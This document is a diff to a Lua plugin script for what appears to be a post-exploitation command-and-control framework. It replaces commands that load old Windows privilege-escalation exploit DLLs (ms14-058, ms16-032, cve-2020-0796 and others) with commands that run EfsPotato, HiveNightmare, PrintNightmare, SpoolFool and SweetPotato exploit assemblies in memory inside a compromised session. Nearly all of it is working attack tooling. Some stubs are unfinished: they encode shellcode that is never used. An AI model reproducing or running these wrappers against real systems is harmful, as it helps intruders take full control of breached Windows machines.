@@ -1,75 +1,110 @@
--- to do
-local elevate = {}
-elevate_dir = "ElevateKit/"
-function new_sac()
+local time = require("time")
+local strings = require("strings")
+local rt = {}
+local root_command = "elevate"
+
+local function command_register(command_name, command_function, help_string, ttp)
+    command(root_command .. ":" .. command_name, command_function, help_string, ttp)
+end
+
+local function new_sac()
     local sac = new_sacrifice(0,false,false,false,"")
 end
--- start ms14-058
-function elevate.parse_ms14_058(args)
-    if #args < 1 then
-        -- to do shellcode self
-        print("Usage: ms14-058 <command>")
-        return nil
+
+-- start EfsPotato_Net3.5.exe
+function rt.EfsPotato_Net35(args)
+    local session = active()
+    local efspotato_path = "Elevate/EfsPotato_Net3.5.exe"
+    return execute_assembly(session, script_resource(efspotato_path), args, true, false, false)
+end
+command_register("EfsPotato_Net3.5", rt.EfsPotato_Net35, "EfsPotato_Net35", "")
+-- end EfsPotato_Net3.5.exe
+
+-- start EfsPotato_Net3.5_CS.exe todo
+function rt.EfsPotato_Net35_Shellcode(args)
+    local session = active()
+    local efspotato_path = "Elevate/EfsPotato_Net3.5_CS.exe"
+    local shellcode = payload_local() -- todo
+    local b64_shellcode = base64_encode(shellcode)
+    return execute_assembly(session, script_resource(efspotato_path), args, true, false, false)
+end
+command_register("EfsPotato_Net3.5_Shellcode", rt.EfsPotato_Net35_Shellcode, "EfsPotato_Net35_Shellcode", "")
+-- end EfsPotato_Net3.5_CS.exe
+
+-- start EfsPotato_Net4.exe
+function rt.EfsPotato_Net40(args)
+    if #args ~= 1 then
+        error("Usage: EfsPotato_Net4.0 <cmd>")
     end
-    local shellcode = payload_local(args[1])
-    return {shellcode}
-end
-function elevate.run_ms14_058(args)
     local session = active()
-    args = elevate.parse_ms14_058(args)
-    print(args[1])
-    local arch = session.Os.Arch
-    local dllpath = script_resource(elevate_dir .. "cve-2014-4113" .. "." .. arch .. ".dll")
-    return inline_dll(session, dllpath,"",args, true, 60, arch, "")
+    local efspotato_path = "Elevate/EfsPotato_Net4.0.exe"
+    return execute_assembly(session, script_resource(efspotato_path), args, true, false, false)
 end
-command("elevatekit:ms14-058", elevate.run_ms14_058, "elevatekit ms14-058", "")
--- end ms14-058
+command_register("EfsPotato_Net4.0", rt.EfsPotato_Net40, "EfsPotato_Net40", "")
+-- end EfsPotato_Net4.exe
 
--- start ms15-051
-function elevate.run_ms15_051(args)
+-- SharpHiveNightmare_Net4.5.exe
+function rt.SharpHiveNightmare_Net45()
     local session = active()
-    args[1] = payload_local(args[1])
-    local arch = session.Os.Arch
-    local dllpath = script_resource(elevate_dir .. "cve-2015-1701" .. "." .. arch .. ".dll")
-    return inline_dll(session, dllpath,"",args, true, 60, arch, "")
+    local sharphivenightmare_path = "Elevate/SharpHiveNightmare_Net4.5.exe"
+    return execute_assembly(session, script_resource(sharphivenightmare_path), {  }, true, false, false)
 end
-command("elevatekit:ms15-051", elevate.run_ms15_051, "elevatekit ms15-051", "")
--- end ms15-051
+command_register("SharpHiveNightmare_Net4.5", rt.SharpHiveNightmare_Net45, "SharpHiveNightmare_Net45", "")
+-- end SharpHiveNightmare_Net4.5.exe
 
--- start ms16-016
-function elevate.run_ms16_016(args)
+-- SharpHiveNightmare_Net4.exe
+function rt.SharpHiveNightmare_Net40()
     local session = active()
-    args[1] = payload_local(args[1])
-    local arch = session.Os.Arch
-    local dllpath = script_resource(elevate_dir .. "cve-2016-0051" .. "." .. arch .. ".dll")
-    return inline_dll(session, dllpath, args, true)
+    local sharphivenightmare_path = "Elevate/SharpHiveNightmare_Net4.0.exe"
+    return execute_assembly(session, script_resource(sharphivenightmare_path), {  }, true, false, false)
 end
-command("elevatekit:ms16-016", elevate.run_ms16_016, "elevatekit ms16-016", "")
--- end ms16-016
+command_register("SharpHiveNightmare_Net4.0", rt.SharpHiveNightmare_Net40, "SharpHiveNightmare_Net40", "")
+-- end SharpHiveNightmare_Net4.exe
 
--- start ms16-032
-function elevate.run_ms16_032(args)
+-- SharpPrintNightmare_Net4.5.exe
+function rt.SharpPrintNightmare_Net45(args)
     local session = active()
-    local arch = session.Os.Arch
-    local ps_script = script_resource( elevate_dir .. "Invoke-MS16032.ps1")
-    return powerpick(session, dllpath, args, true,false,false)
+    local sharpprintnightmare_path = "Elevate/SharpPrintNightmare_Net4.5.exe"
+    return execute_assembly(session, script_resource(sharpprintnightmare_path), { }, true, false, false)
 end
-command("elevatekit:ms16-032", elevate.run_ms16_032, "elevatekit ms16-032", "")
--- end ms16-032
+command_register("SharpPrintNightmare_Net4.5", rt.SharpPrintNightmare_Net45, "SharpPrintNightmare_Net45", "")
+-- end SharpPrintNightmare_Net4.5.exe
 
--- start cve_2020_0796
-function elevate.run_cve_2020_0796(args)
-    session = active()
-    arch = session.Os.Arch
-    if arch == "x32" then
-        error("x32 not supported")
-        return
+-- SharpPrintNightmare_Net4.exe
+function rt.SharpPrintNightmare_Net40(args)
+    local session = active()
+    local sharpprintnightmare_path = "Elevate/SharpPrintNightmare_Net4.0.exe"
+    return execute_assembly(session, script_resource(sharpprintnightmare_path), { }, true, false, false)
+end
+command_register("SharpPrintNightmare_Net4.0", rt.SharpPrintNightmare_Net40, "SharpPrintNightmare_Net40", "")
+-- end SharpPrintNightmare_Net4.exe
+
+-- SpoolFool_Net4.exe
+function rt.SpoolFool_Net40(args)
+    local session = active()
+    local spoolfool_path = "Elevate/SpoolFool_Net4.0.exe"
+    return execute_assembly(session, script_resource(spoolfool_path), args, true, false, false)
+end
+command_register("SpoolFool_Net4.0", rt.SpoolFool_Net40, "SpoolFool_Net40", "")
+-- end SpoolFool_Net4.exe
+
+-- SweetPotato4-46.exe
+function rt.SweetPotato4_46(args)
+    if #args ~= 2 then
+        error("Usage: SweetPotato4-46 <cmd>")
     end
-    args[1] = payload_local(args[1])
-
-    dllpath = script_resource(elevate_dir .. "cve-2020-0796" .. "." .. arch .. ".dll")
-    return inline_dll(session, dllpath, args, true)
+    local session = active()
+    local sweetpotato_path = "Elevate/SweetPotato4-46.exe"
+    return execute_assembly(session, script_resource(sweetpotato_path), args, true, false, false)
 end
-command("elevatekit:cve-2020-0796", elevate.run_cve_2020_0796, "elevatekit cve-2020-0796", "")
--- end cve_2020_0796
+command_register("SweetPotato4-46", rt.SweetPotato4_46, "SweetPotato4-46", "")
+-- end SweetPotato4-46.exe
 
+-- SweetPotato_CS.exe todo
+function rt.SweetPotato_CS(args)
+    local session = active()
+    local sweetpotato_path = "Elevate/SweetPotato_CS.exe"
+    local shellcode = payload_local() -- todo
+    local b64_shellcode = base64_encode(shellcode)
+    return execute_assembly(session, script_resource(sweetpotato_path), args, true, false, false)
+end
